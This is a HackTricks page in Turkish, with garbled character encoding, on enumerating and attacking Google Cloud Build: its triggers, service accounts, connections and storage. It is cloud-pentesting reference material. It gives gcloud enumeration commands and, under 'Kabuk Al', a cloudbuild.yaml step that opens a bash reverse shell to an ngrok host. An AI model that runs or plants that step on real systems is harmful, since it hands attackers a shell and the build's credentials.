# GCP - Cloud Build Enum

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek.

</details>

## Temel Bilgiler

Google Cloud Build, **yazÄ±lÄ±m derleme** ve sÃ¼rÃ¼m sÃ¼reÃ§lerini otomatikleÅŸtiren, **kaynak kod depolarÄ±yla entegre olan** ve geniÅŸ bir programlama dilini destekleyen yÃ¶netilen bir CI/CD platformudur. GeliÅŸtiricilere kodu otomatik olarak derleme, test etme ve daÄŸÄ±tma olanaÄŸÄ± saÄŸlarken derleme adÄ±mlarÄ±nÄ± ve iÅŸ akÄ±ÅŸlarÄ±nÄ± Ã¶zelleÅŸtirmelerine olanak tanÄ±r.

Her Cloud Build Tetikleyicisi, bir **Cloud Deposu ile iliÅŸkilidir veya harici bir depo ile doÄŸrudan baÄŸlantÄ±lÄ±dÄ±r** (Github, Bitbucket ve Gitlab).

{% hint style="success" %}
Buradan veya Bulut DepolarÄ±ndan Github/Bitbucket belirteci Ã§almak iÃ§in herhangi bir yol gÃ¶remedim Ã§Ã¼nkÃ¼ depo indirildiÄŸinde [https://source.cloud.google.com/](https://source.cloud.google.com/) URL'si Ã¼zerinden eriÅŸilir ve Github istemci tarafÄ±ndan eriÅŸilmez.
{% endhint %}

### Olaylar

Cloud Build, ÅŸu durumlarda tetiklenebilir:

* **Bir ÅŸubeye itme**: Åubeyi belirtin
* **Yeni bir etiket itme**: Etiketi belirtin
* **Ã‡ekme isteÄŸi**: PR'yi alan ÅŸubeyi belirtin
* **Manuel Ã‡aÄŸrÄ±**
* **Pub/Sub mesajÄ±**: Konuyu belirtin
* **Web kancasÄ± olayÄ±**: Bir HTTPS URL'si aÃ§Ä±ÄŸa Ã§Ä±karacak ve istek bir sÄ±rla kimlik doÄŸrulamasÄ± yapmalÄ±

### YÃ¼rÃ¼tme

3 seÃ§enek vardÄ±r:

* YÃ¼rÃ¼tÃ¼lecek komutlarÄ± belirten bir yaml/json. Genellikle: `/cloudbuild.yaml`
* Web konsolunda ve cli'de "iÃ§e" belirtilebilecek tek seÃ§enek
* En yaygÄ±n seÃ§enek
* Kimlik doÄŸrulamasÄ±z eriÅŸim iÃ§in ilgili
* Derlemek iÃ§in bir **Dockerfile**
* Derlemek iÃ§in bir **Buildpack**

### SA Ä°zinleri

**Hizmet HesabÄ± `cloud-platform` kapsamÄ±na sahiptir**, bu nedenle **tÃ¼m ayrÄ±calÄ±klarÄ± kullanabilir.** **SA belirtilmediÄŸinde** (Ã¶rneÄŸin, gÃ¶nderme yapÄ±lÄ±rken) **varsayÄ±lan SA** `<proj-numarasÄ±>@cloudbuild.gserviceaccount.com` **kullanÄ±lacaktÄ±r.**

VarsayÄ±lan olarak hiÃ§bir izin verilmez ancak bazÄ± izinler vermek oldukÃ§a kolaydÄ±r:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Onaylar

Bir Cloud Build'in **derleme yÃ¼rÃ¼tÃ¼mleri iÃ§in onay gerektirmesi** mÃ¼mkÃ¼ndÃ¼r (varsayÄ±lan olarak devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸtÄ±r).

### BaÄŸlantÄ±lar ve Depolar

BaÄŸlantÄ±lar ÅŸunlar Ã¼zerinden oluÅŸturulabilir:

* **GitHub:** Github belirteci almak iÃ§in izin isteyen bir OAuth iletiÅŸim kutusu gÃ¶sterecektir, bu belirteÃ§ **Secret Manager iÃ§inde saklanacaktÄ±r.**
* **GitHub Enterprise:** Bir **GithubApp** yÃ¼klemek iÃ§in istekte bulunacaktÄ±r. GitHub Enterprise ana bilgisayarÄ±nÄ±zdan bir kimlik doÄŸrulama belirteci oluÅŸturulacak ve bu proje iÃ§inde bir **Secret Manager** sÄ±rrÄ± olarak saklanacaktÄ±r.
* **GitLab / Enterprise:** **API eriÅŸim belirteci ve Okuma API eriÅŸim belirteci** saÄŸlamanÄ±z gerekecektir, bu belirteÃ§ler **Secret Manager'da saklanacaktÄ±r.**

Bir baÄŸlantÄ± oluÅŸturulduÄŸunda, Github hesabÄ±nÄ±n eriÅŸimine sahip olduÄŸu depolarÄ± **baÄŸlamak iÃ§in kullanabilirsiniz.**

Bu seÃ§enek, aÅŸaÄŸÄ±daki dÃ¼ÄŸme aracÄ±lÄ±ÄŸÄ±yla kullanÄ±labilir:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Bu yÃ¶ntemle baÄŸlanan depolarÄ±n yalnÄ±zca 2. nesil kullanarak Tetikleyicilerde mevcut olduÄŸunu unutmayÄ±n.
{% endhint %}

### Bir Depoyu BaÄŸlama

Bu bir **`baÄŸlantÄ±`** ile aynÄ± deÄŸildir. Bu, **farklÄ±** ÅŸekillerde bir **Github veya Bitbucket** deposuna **eriÅŸim saÄŸlar ancak bir baÄŸlantÄ± nesnesi oluÅŸturmaz, ancak bir depo nesnesi oluÅŸturur (1. nesil).**

Bu seÃ§enek, aÅŸaÄŸÄ±daki dÃ¼ÄŸme aracÄ±lÄ±ÄŸÄ±yla kullanÄ±labilir:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Depolama

Bazen Cloud Build, tetikleyici iÃ§in dosyalarÄ± depolamak iÃ§in **yeni bir depolama oluÅŸturacaktÄ±r**. Bu Ã¶rneÄŸin, GCP'nin sunduÄŸu Ã¶rnekte olduÄŸu gibi gerÃ§ekleÅŸir:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### Kabuk Al

Bir `.tgz` dosyasÄ±nÄ± saklamak iÃ§in [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) adÄ±nda bir Depolama kovasÄ± oluÅŸturulmuÅŸtur.
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### SÄ±ralama

**YapÄ±landÄ±rma ve gÃ¼nlÃ¼klerde hassas bilgiler bulabilirsiniz**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Yetki YÃ¼kseltme

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Kimlik DoÄŸrulamasÄ±z EriÅŸim

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### SaldÄ±rÄ± SonrasÄ± AÅŸamalar

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>SÄ±fÄ±rdan Kahramana AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) hakkÄ±nda bilgi edinin
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
